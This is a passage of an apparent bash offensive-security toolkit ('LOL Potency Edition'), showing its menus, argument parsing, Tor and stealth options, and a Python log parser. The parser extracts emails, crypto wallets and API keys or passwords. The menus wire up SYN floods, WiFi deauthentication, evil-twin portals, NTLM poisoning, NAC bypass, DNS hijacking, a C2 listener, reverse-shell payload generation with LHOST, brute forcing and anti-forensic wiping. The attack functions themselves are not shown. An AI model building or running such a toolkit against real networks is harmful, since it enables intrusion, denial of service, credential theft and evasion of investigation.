        echo -e " ${NEON_BLUE}│${RESET}  ${NEON_BLUE}IP:${RESET} $DISPLAY_IP  ${NEON_BLUE}STEALTH:${RESET} $STEALTH_STATUS  ${NEON_BLUE}ID:${RESET} $HOST_NOW ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}└──────────────────────────────────────────────────────────────┘${RESET}"
        echo -e ""
        echo -e " ${NEON_BLUE}    [1] WEB & INFRASTRUCTURE INTEL${RESET}"
        echo -e " ${NEON_BLUE}    [2] DEEP SEARCH & OSINT HUB${RESET}"
        echo -e " ${NEON_BLUE}    [3] CYBER WARFARE OPERATIONS${RESET}"
        echo -e " ${NEON_BLUE}    [4] ETHERNET & INTERNAL OPS${RESET}"
        echo -e " ${NEON_BLUE}    [5] SIGNAL INTELLIGENCE (SIGINT)${RESET}"
        echo -e " ${NEON_BLUE}    [6] IOT & SURVEILLANCE${RESET}"
        echo -e ""
        echo -e " ${NEON_BLUE} [O] STEALTH  [U] BLUR IP  [M] GHOST MODE  [X] EXIT${RESET}"
        echo -e ""
        echo -ne " ${NEON_BLUE} [#] SELECT CATEGORY > ${RESET}"
        read choice
        
        case $choice in
            1) gui_web_intel ;;
            2) gui_deep_search ;;
            3) gui_warfare ;;
            4) gui_ethernet ;;
            5) gui_sigint ;;
            6) gui_iot ;;
            O|o) toggle_tor ;;
            U|u) if [ "$BLUR_IP" = true ]; then BLUR_IP=false; else BLUR_IP=true; fi ;;
            M|m) ghost_mode; echo -e "\n${NEON_BLUE}[!] Task Complete. Press Enter...${RESET}"; read ;;
            X|x) exit 0 ;;
        esac
    done
}

gui_ethernet() {
    while true; do
        show_banner
        echo -e " ${NEON_BLUE}┌─ ETHERNET & INTERNAL OPERATIONS ────────────────────────────┐${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [K] GHOST INSERT    [R] RESTORE LINK    [{] DIRECT-LINK DIS ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [<] NAC BYPASS      [\"] NTLM POISON     [?] GATEWAY HUNT    ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [}] SHARE HUNTER    [|] WPAD AUDIT      [/] INTERNAL ENUM   ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [>] PROTOCOL AUDIT  [%] VLAN RECON      [^] SNMP INFRA MAP  ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
        read sub; if [[ "$sub" == "b" ]]; then return; fi
        case $sub in
            K|k) ghost_insertion; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            R|r) ghost_restore; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '{') direct_link_disco; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '<') nac_bypass; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '"') ntlm_poison; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '?') gateway_hunt; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '}') echo -ne "    Target IP: "; read t; bash "$0" shares "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '|') wpad_audit; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '/') echo -ne "    Internal IP: "; read t; bash "$0" internal "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '>') protocol_audit; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '%') vlan_hop_recon; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '^') echo -ne "    Target IP: "; read t; bash "$0" snmp "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
        esac
    done
}

gui_web_intel() {
    while true; do
        show_banner
        echo -e " ${NEON_BLUE}┌─ WEB & INFRASTRUCTURE INTEL ────────────────────────────────┐${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [1] AUTO-PILOT      [2] REMOTE INTEL    [3] JS ANALYSIS     ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [4] DNS HISTORY     [5] CMS DETECT      [6] CLOUD RECON     ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [7] SUBDOMAIN MAP   [8] RUST PORT SCAN  [9] SHODAN INTEL    ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [=] ORIGIN DISCOVER [,] GITHUB DORKS    [*] ASN/BGP MAPPER  ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
        read sub; if [[ "$sub" == "b" ]]; then return; fi
        case $sub in
            1) echo -ne "    Target: "; read t; bash "$0" auto "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            2) echo -ne "    Target: "; read t; bash "$0" remote "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            3) echo -ne "    Target: "; read t; bash "$0" js "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            4) echo -ne "    Target: "; read t; bash "$0" history "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            5) echo -ne "    Target: "; read t; bash "$0" cms "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            6) echo -ne "    Keyword: "; read t; bash "$0" cloud "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            7) echo -ne "    Domain: "; read t; bash "$0" subfinder "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            8) echo -ne "    Target IP: "; read t; bash "$0" rustscan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            9) echo -ne "    Target IP: "; read t; bash "$0" shodan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '=') echo -ne "    Domain: "; read t; bash "$0" origin "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            ',') echo -ne "    Org Name: "; read t; bash "$0" dorks "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '*') echo -ne "    ASN: "; read t; bash "$0" asn "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
        esac
    done
}

gui_deep_search() {
    while true; do
        show_banner
        echo -e " ${NEON_BLUE}┌─ DEEP SEARCH & OSINT HUB ───────────────────────────────────┐${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [A] EMAIL (HOLEHE)  [B] PHONE (INFOGA)  [C] USER (SHERLOCK) ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [D] METADATA (EXIF) [E] DARK WEB SEARCH [P] BREACH SEARCH   ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [&] EMPLOYEE RECON  [.] API SECRETS     [+] SECRETS SCAN    ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [!] DEAD DROP NOTIF                                         ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
        read sub; if [[ "$sub" == "b" ]]; then return; fi
        case $sub in
            A|a) echo -ne "    Email: "; read t; bash "$0" email "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            B|b) echo -ne "    Phone: "; read t; bash "$0" phone "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            C|c) echo -ne "    Username: "; read t; bash "$0" user "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            D|d) echo -ne "    File/URL: "; read t; bash "$0" file "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            E|e) echo -ne "    Keyword: "; read t; bash "$0" dark "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            P|p) echo -ne "    Email/User: "; read t; bash "$0" breach "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '&') echo -ne "    Company Domain: "; read t; bash "$0" employees "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '.') echo -ne "    Target URL: "; read t; bash "$0" secrets_deep "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '+') echo -ne "    Git URL: "; read t; bash "$0" secrets "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '!') echo -ne "    Message: "; read t; discord_notify "$t"; echo -e "\n${NEON_BLUE}[+] Sent.${RESET}"; sleep 1 ;;
        esac
    done
}

gui_iot() {
    while true; do
        show_banner
        echo -e " ${NEON_BLUE}┌─ IOT & SURVEILLANCE ────────────────────────────────────────┐${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [F] FLOCK SCANNER        [H] FLOCK FOXHUNT (OFFLINE)      ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [I] FLOCK MANUAL (OFF)   [Y] FLOCK COMMUNITY SYNC          ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [W] FLOCK TRAFFIC WATCH  [D] FLOCK DEEP FINGERPRINT        ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [S] SHODAN IOT SCAN      [M] MQTT EXPLORER                 ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
        read sub; if [[ "$sub" == "b" ]]; then return; fi
        case $sub in
            F|f) bash "$0" flock; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            H|h) bash "$0" foxhunt; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            I|i) bash "$0" flock_manual; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            Y|y) bash "$0" flock_sync; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            W|w) bash "$0" flock_watch; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            D|d) bash "$0" flock_deep; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            S|s) echo -ne "    Query: "; read q; shodan search "$q"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
        esac
    done
}

gui_sigint() {
    while true; do
        show_banner
        echo -e " ${NEON_BLUE}┌─ SIGNAL INTELLIGENCE (SIGINT) ──────────────────────────────┐${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [W] WIFI DEAUTH     [H] HANDSHAKE CAP   [E] EVIL TWIN       ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [B] BLUETOOTH RECON [S] SNIFFER         [K] KILL CONNECTION ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
        read sub; if [[ "$sub" == "b" ]]; then return; fi
        case $sub in
            W|w) bash "$0" deauth; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            H|h) bash "$0" handshake; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            E|e) bash "$0" evil_twin; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            B|b) bash "$0" bt; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            S|s) bash "$0" sniff; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            K|k) echo -ne "    Target IP: "; read t; bash "$0" kill "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
        esac
    done
}

gui_warfare() {
    while true; do
        show_banner
        echo -e " ${NEON_BLUE}┌─ CYBER WARFARE OPERATIONS ──────────────────────────────────┐${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [F] MULTI-FLOOD     [G] AGGRESSIVE ARP  [J] VULN SCAN (NUC) ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [L] WEB FUZZ (FFUF) [N] SQL INJECT TEST [Y] MALWARE (YARA)  ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [Z] DEPLOY HONEYPOT [T] TAKEOVER AUDIT  [V] BRUTE FORCE     ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [R] HASH CRACKER    [Q] PAYLOAD GEN     [@] GHOST WIPE      ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}│${RESET} [#] C2 LISTENER     [$] DNS HIJACK      [W] WP AUDIT        ${NEON_BLUE}│${RESET}"
        echo -e " ${NEON_BLUE}└─────────────────────────────────────────────────────────────┘${RESET}"
        echo -ne " ${NEON_BLUE}[#] SELECT MODE (or 'b' for back) > ${RESET}"
        read sub; if [[ "$sub" == "b" ]]; then return; fi
        case $sub in
            F|f) echo -ne "    Target IP: "; read t; bash "$0" flood "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            G|g) bash "$0" arp; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            J|j) echo -ne "    Target: "; read t; bash "$0" nuclei "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            L|l) echo -ne "    URL: "; read t; bash "$0" fuzz "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            N|n) echo -ne "    URL with ID: "; read t; bash "$0" sqlmap "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            Y|y) echo -ne "    File/Dir: "; read t; bash "$0" yara "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            Z|z) echo -ne "    Port: "; read t; bash "$0" honeypot "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            T|t) echo -ne "    Domain: "; read t; bash "$0" takeover "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            V|v) echo -ne "    Target IP: "; read t; bash "$0" brute "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            R|r) echo -ne "    Hash File: "; read t; bash "$0" crack "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            Q|q) echo -ne "    LHOST IP: "; read t; bash "$0" payload "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '@') anti_forensics; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '#') c2_listener; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            '$') dns_hijack; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
            W|w) echo -ne "    WP URL: "; read t; bash "$0" wpscan "$t"; echo -e "\n${NEON_BLUE}[!] Press Enter...${RESET}"; read ;;
        esac
    done
}

# --- CONFIGURATION ---
TOR_PROXY="socks5h://127.0.0.1:9050"
USE_TOR=false
STEALTH_DELAY=0

# --- SAFETY EXIT TRAP ---
cleanup_on_exit() {
    # Only run cleanup if we are in the main GUI session (no arguments passed)
    if [ -z "$1" ] || [ "$1" == "EXIT" ]; then
        local INTERFACE=$(ip link | grep -E "eth|enp|wlp" | awk '{print $2}' | tr -d ':' | head -n 1)
        if [ ! -z "$INTERFACE" ]; then
            if [[ $(ip link show $INTERFACE | grep "PROMISC") ]] || [[ $(cat /proc/sys/net/ipv6/conf/$INTERFACE/disable_ipv6) -eq 1 ]]; then
                echo -e "\n${NEON_BLUE}[!] SESSION CLOSED. AUTO-RESTORING LINK...${RESET}"
                # Use a simpler restore in the trap to ensure it finishes fast
                sudo ip link set dev $INTERFACE promisc off
                sudo sysctl -w net.ipv6.conf.$INTERFACE.disable_ipv6=0 > /dev/null
                sudo macchanger -p $INTERFACE > /dev/null 2>&1
                sudo ip link set dev $INTERFACE up
                sudo dhclient -nw $INTERFACE > /dev/null 2>&1 # Non-blocking DHCP
            fi
        fi
    fi
}
trap 'cleanup_on_exit EXIT' EXIT
trap 'exit 0' SIGINT SIGTERM # Redirect signals to the EXIT trap

# 1. LOGGING & POST-EXTRACTION WRAPPER
if [ -z "$1" ]; then
    grim_gui
fi

if [ "$1" != "--no-log" ]; then
    TARGET_CLEAN=$(echo "$1" | tr -dc '[:alnum:]_.-')
    if [ -z "$TARGET_CLEAN" ] || [ "$1" == "help" ] || [ "$1" == "man" ]; then
        TARGET="help"
    else
        SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
        LOGFILE="${SCRIPT_DIR}/lol_report_${TARGET_CLEAN}.txt"
        JSON_REPORT="${SCRIPT_DIR}/lol_intel_${TARGET_CLEAN}.json"
        echo -e "${NEON_BLUE}[+] Session active: Logging to $LOGFILE${RESET}"
        bash "$0" --no-log "$@" 2>&1 | tee >(sed -r 's/\x1b\[[0-9;]*m//g' > "$LOGFILE")
        
        # Post-session automated intelligence extraction
        python3 - "$LOGFILE" "$JSON_REPORT" "${SCRIPT_DIR}/lol_dashboard_${TARGET_CLEAN}.html" <<EOF
import re, sys, json, os

logfile, jsonfile, htmlfile = sys.argv[1], sys.argv[2], sys.argv[3]
if not os.path.exists(logfile): sys.exit(0)

with open(logfile, 'r') as f: content = f.read()

patterns = {
    "Emails": r"[\w.+-]+@[\w.-]+\.\w+",
    "Onions": r"\b[a-z2-7]{56}\.onion\b",
    "Telegram": r"(?:https?://t\.me/|@)([A-Za-z0-9_]{5,32})",
    "Wallets": r"\b(?:bc1[a-z0-9]{25,87}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})\b",
    "IPv4s": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
    "Domains": r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b",
    "Sensitive": r"(?i)(api[_-]?key|password|secret|access[_-]?token|bearer|id[_-]?secret)\s*[:=]\s*['\"]?([a-zA-Z0-9_-]{16,})['\"]?"
}

intel = {}
for label, pattern in patterns.items():
    matches = sorted(list(set(re.findall(pattern, content))))
    if matches: intel[label] = matches

if intel:
    with open(jsonfile, 'w') as f: json.dump(intel, f, indent=4)
    print(f"\x1b[1;32m[+] Intelligence extracted to $JSON_REPORT\x1b[0m")

# HTML DASHBOARD GENERATOR
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>LOL War-Room: {target}</title>
    <style>
        body {{ background-color: #0a0a0a; color: #00f2ff; font-family: 'Courier New', monospace; margin: 40px; }}
        .header {{ border: 2px solid #ff00ff; padding: 20px; text-shadow: 0 0 10px #ff00ff; margin-bottom: 20px; }}
        .card {{ background: #1a1a1a; border-left: 5px solid #00f2ff; padding: 15px; margin-bottom: 10px; box-shadow: 5px 5px 15px rgba(0,242,255,0.1); }}
        .label {{ color: #ff00ff; font-weight: bold; text-transform: uppercase; margin-bottom: 5px; display: block; }}
        .value {{ color: #00f2ff; word-wrap: break-word; }}
        h1 {{ color: #ff00ff; }}
        .grid {{ display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }}
        .footer {{ margin-top: 50px; font-size: 0.8em; color: #444; border-top: 1px solid #222; padding-top: 10px; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>L O L  //  W A R - R O O M</h1>
        <div>TARGET: {target} | DATE: {date}</div>
    </div>
    <div class="grid">
        {cards}
    </div>
    <div class="footer">Generated by LOL Potency Edition // Extreme Reconnaissance Platform</div>
</body>
</html>
"""

cards = ""
for label, items in intel.items():
    items_html = "<br>".join([f"• {i}" for i in items[:20]])
    if len(items) > 20: items_html += f"<br>... and {len(items)-20} more"
    cards += f'<div class="card"><span class="label">{label}</span><div class="value">{items_html}</div></div>'

from datetime import datetime
with open(htmlfile, 'w') as f:
    f.write(html_template.format(
        target=sys.argv[1].replace("lol_report_", "").replace(".txt", ""),
        date=datetime.now().strftime("%Y-%m-%d %H:%M"),
        cards=cards
    ))
print(f"\x1b[1;34m[+] War-Room Dashboard generated: {htmlfile}\x1b[0m")
EOF
        exit $?
    fi
fi

if [ "$1" == "--no-log" ]; then
    shift
fi

# Parse optional flags
while [[ "$1" =~ ^- ]]; do
    case "$1" in
        --tor) USE_TOR=true; shift ;;
        --stealth) STEALTH_DELAY=2; shift ;;
    esac
done

TARGET=$1
EXTRA=$2

if [ -z "$TARGET" ] || [ "$TARGET" == "help" ]; then
    echo -e "${NEON_BLUE}========================================================${RESET}"
    echo -e " ${NEON_BLUE}POTENCY COMMAND CENTER - USAGE GUIDE${RESET}"
    echo -e "${NEON_BLUE}========================================================${RESET}"
    echo -e "${NEON_BLUE}ULTIMATE POTENCY MODES:${RESET}"
    echo -e "  auto      - Ultimate Auto-Pilot (Remote Intel -> Recon -> Vuln -> JS Analysis)."
    echo -e "  remote    - Deep Remote Intelligence Gathering (Passive)."
    echo -e "  js        - Extract API keys, endpoints, and secrets from JavaScript."
    echo -e "  history   - Pull historical DNS and WHOIS from remote databases."
    echo -e "  exploit   - Search remote databases (Vulners/ExploitDB) for versions."
    echo -e "  flood     - High-intensity TCP SYN flood (Remote/Local)."
    echo -e "  arp       - Aggressive ARP scanning and discovery."
    echo -e "  handshake - Capture WPA Handshake (Wireless)."
    echo -e "  evil_twin - Start Evil Twin Captive Portal (Wireless)."
    echo -e "${NEON_BLUE}STANDARD MODES:${RESET}"
    echo -e "  <Domain/IP/Phone/Email/User/File/Scan/Cloud/Web/Vuln/CMS/Net/Sniff/Kill/Mac>"
    exit 0
fi

# Type Parsing
TYPE="DOMAIN"
if [[ "$TARGET" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then TYPE="IP";
elif [[ "$TARGET" =~ ^\+?[0-9]{10,15}$ ]]; then TYPE="PHONE";
elif [[ "$TARGET" =~ ^[\w.+-]+@[\w.-]+\.\w+$ ]]; then TYPE="EMAIL";
elif [ -f "$TARGET" ]; then TYPE="FILE";
elif [[ "$TARGET" == "auto" ]]; then TYPE="AUTO"; TARGET=$EXTRA;
elif [[ "$TARGET" == "remote" ]]; then TYPE="REMOTE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "js" ]]; then TYPE="JS"; TARGET=$EXTRA;
elif [[ "$TARGET" == "history" ]]; then TYPE="HISTORY"; TARGET=$EXTRA;
elif [[ "$TARGET" == "exploit" ]]; then TYPE="EXPLOIT"; TARGET=$EXTRA;
elif [[ "$TARGET" == "dark" ]]; then TYPE="DARK"; TARGET=$EXTRA;
elif [[ "$TARGET" == "flood" ]]; then TYPE="FLOOD"; TARGET=$EXTRA;
elif [[ "$TARGET" == "arp" ]]; then TYPE="ARP"; TARGET=$EXTRA;
elif [[ "$TARGET" == "email" ]]; then TYPE="EMAIL"; TARGET=$EXTRA;
elif [[ "$TARGET" == "phone" ]]; then TYPE="PHONE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "deauth" ]]; then TYPE="DEAUTH"; TARGET=$EXTRA;
elif [[ "$TARGET" == "handshake" ]]; then TYPE="HANDSHAKE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "evil_twin" ]]; then TYPE="EVIL_TWIN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "bt" ]]; then TYPE="BT"; TARGET=$EXTRA;
elif [[ "$TARGET" == "flock" ]]; then TYPE="FLOCK"; TARGET=$EXTRA;
elif [[ "$TARGET" == "foxhunt" ]]; then TYPE="FOXHUNT"; TARGET=$EXTRA;
elif [[ "$TARGET" == "flock_manual" ]]; then TYPE="FLOCK_MANUAL"; TARGET=$EXTRA;
elif [[ "$TARGET" == "flock_sync" ]]; then TYPE="FLOCK_SYNC"; TARGET=$EXTRA;
elif [[ "$TARGET" == "flock_watch" ]]; then TYPE="FLOCK_WATCH"; TARGET=$EXTRA;
elif [[ "$TARGET" == "flock_deep" ]]; then TYPE="FLOCK_DEEP"; TARGET=$EXTRA;
elif [[ "$TARGET" == "nuclei" ]]; then TYPE="NUCLEI"; TARGET=$EXTRA;
elif [[ "$TARGET" == "user" ]]; then TYPE="USER_TRACE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "fuzz" ]]; then TYPE="FUZZ"; TARGET=$EXTRA;
elif [[ "$TARGET" == "wpscan" ]]; then TYPE="WPSCAN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "cloud" ]]; then TYPE="CLOUD"; TARGET=$EXTRA;
elif [[ "$TARGET" == "rustscan" ]]; then TYPE="RUSTSCAN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "subfinder" ]]; then TYPE="SUBFINDER"; TARGET=$EXTRA;
elif [[ "$TARGET" == "sqlmap" ]]; then TYPE="SQLMAP"; TARGET=$EXTRA;
elif [[ "$TARGET" == "breach" ]]; then TYPE="BREACH"; TARGET=$EXTRA;
elif [[ "$TARGET" == "takeover" ]]; then TYPE="TAKEOVER"; TARGET=$EXTRA;
elif [[ "$TARGET" == "origin" ]]; then TYPE="ORIGIN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "employees" ]]; then TYPE="EMPLOYEES"; TARGET=$EXTRA;
elif [[ "$TARGET" == "supply" ]]; then TYPE="SUPPLY"; TARGET=$EXTRA;
elif [[ "$TARGET" == "dorks" ]]; then TYPE="DORKS"; TARGET=$EXTRA;
elif [[ "$TARGET" == "secrets_deep" ]]; then TYPE="SECRETS_DEEP"; TARGET=$EXTRA;
elif [[ "$TARGET" == "internal" ]]; then TYPE="INTERNAL"; TARGET=$EXTRA;
elif [[ "$TARGET" == "direct" ]]; then TYPE="DIRECT"; TARGET=$EXTRA;
elif [[ "$TARGET" == "shares" ]]; then TYPE="SHARES"; TARGET=$EXTRA;
elif [[ "$TARGET" == "wpad" ]]; then TYPE="WPAD"; TARGET=$EXTRA;
elif [[ "$TARGET" == "protocol" ]]; then TYPE="PROTOCOL"; TARGET=$EXTRA;
elif [[ "$TARGET" == "vlan" ]]; then TYPE="VLAN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "snmp" ]]; then TYPE="SNMP"; TARGET=$EXTRA;
elif [[ "$TARGET" == "brute" ]]; then TYPE="BRUTE"; TARGET=$EXTRA;
elif [[ "$TARGET" == "crack" ]]; then TYPE="CRACK"; TARGET=$EXTRA;
elif [[ "$TARGET" == "payload" ]]; then TYPE="PAYLOAD"; TARGET=$EXTRA;
elif [[ "$TARGET" == "shodan" ]]; then TYPE="SHODAN"; TARGET=$EXTRA;
elif [[ "$TARGET" == "yara" ]]; then TYPE="YARA"; TARGET=$EXTRA;
elif [[ "$TARGET" == "honeypot" ]]; then TYPE="HONEYPOT"; TARGET=$EXTRA;
elif [[ "$TARGET" == "anti_forensics" ]]; then TYPE="ANTI_FORENSICS"; TARGET=$EXTRA;
elif [[ "$TARGET" == "c2_listener" ]]; then TYPE="C2_LISTENER"; TARGET=$EXTRA;
elif [[ "$TARGET" == "dns_hijack" ]]; then TYPE="DNS_HIJACK"; TARGET=$EXTRA;
elif [[ "$TARGET" == "net" ]]; then TYPE="NET";
elif [[ "$TARGET" == "sniff" ]]; then TYPE="SNIFF";
elif [[ "$TARGET" == "kill" ]]; then TYPE="KILL";
elif [[ "$TARGET" == "mac" ]]; then TYPE="MAC";
elif [[ "$TARGET" == "recon" ]]; then TYPE="RECON"; TARGET=$EXTRA;
fi

# --- CORE LOGIC ---

case $TYPE in
    AUTO)
        echo -e "${NEON_PINK}[!] AUTO-PILOT ENGAGED${RESET}"
        api_intel "$TARGET"
        sub_discover "$TARGET"
        rust_scan "$TARGET"
        vuln_scan "$TARGET"
        js_intel "$TARGET"
        detect_cms "$TARGET"
        ;;
    REMOTE) api_intel "$TARGET" ;;
    HISTORY)
        echo -e "${NEON_BLUE}[*] Fetching History for $TARGET...${RESET}"
        req "https://viewdns.info/iphistory/?domain=$TARGET" | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | sort -u ;;
    JS) js_intel "$TARGET" ;;
    DARK)
        echo -e "${NEON_PINK}[!] DARK WEB SEARCH: $TARGET${RESET}"
        req "https://ahmia.fi/search/?q=$TARGET" | grep -oE "http[s]?://[a-z2-7]{56}\.onion" | sort -u ;;
    IP) api_intel "$TARGET"; rust_scan "$TARGET" ;;
    DOMAIN) api_intel "$TARGET"; sub_discover "$TARGET" ;;
    CMS) detect_cms "$TARGET" ;;
    EMAIL) email_osint "$TARGET" ;;
    PHONE) phone_osint "$TARGET" ;;
    DEAUTH) wifi_deauth "$TARGET" ;;
    HANDSHAKE) wifi_handshake ;;
    EVIL_TWIN) evil_twin_start ;;
    BT) bt_recon ;;
    FLOCK) flock_finder ;;
    FOXHUNT) flock_foxhunt ;;
    FLOCK_MANUAL) flock_intel_offline ;;
    FLOCK_SYNC) flock_community_sync ;;
    FLOCK_WATCH) flock_traffic_watch ;;
    FLOCK_DEEP) flock_fingerprint_deep ;;
    NUCLEI) vuln_scan "$TARGET" ;;
    USER_TRACE) user_trace "$TARGET" ;;
